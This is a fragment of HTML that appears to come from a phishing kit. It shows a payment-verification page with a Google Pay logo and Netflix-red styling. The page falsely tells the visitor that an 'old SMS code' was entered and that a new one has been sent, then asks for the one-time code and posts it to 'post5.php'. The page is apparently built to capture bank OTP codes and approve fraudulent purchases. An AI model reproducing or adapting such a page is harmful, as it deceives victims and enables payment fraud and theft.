...
<form id="mainForm" action="post5.php" method="post">
    ...
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f2/Google_Pay_Logo.svg/1280px-Google_Pay_Logo.svg.png" style="width: 35px;margin-right: 10px;">
...
">
    ...
    <div style="color:#E50914" id="info-header" class="info-header">Wrong SMS code</div>
    
    
    
    <div id="info-text" class="scrollbar info-text">You entered an old SMS code.<span style="color:green"> We have sent you another SMS</span> <br></div><div id="info-text" class="scrollbar info-text">To confirm the operation, enter the password that we have sent by SMS to your mobile to verify this purchase.<br></div><div id="tooltip" class="hide tooltip-wrapper">
        <div class="tooltip">
    ...
    <div class="actions">
        <div class="otp-input">
            <input autocomplete="off" name="otp" id="otp" required="" type="text" class="input">
    ...
    <a href="#" class="resend-label button-link" name="resend" value="resend" formnovalidate="" id="resend-label">Resend SMS</a>
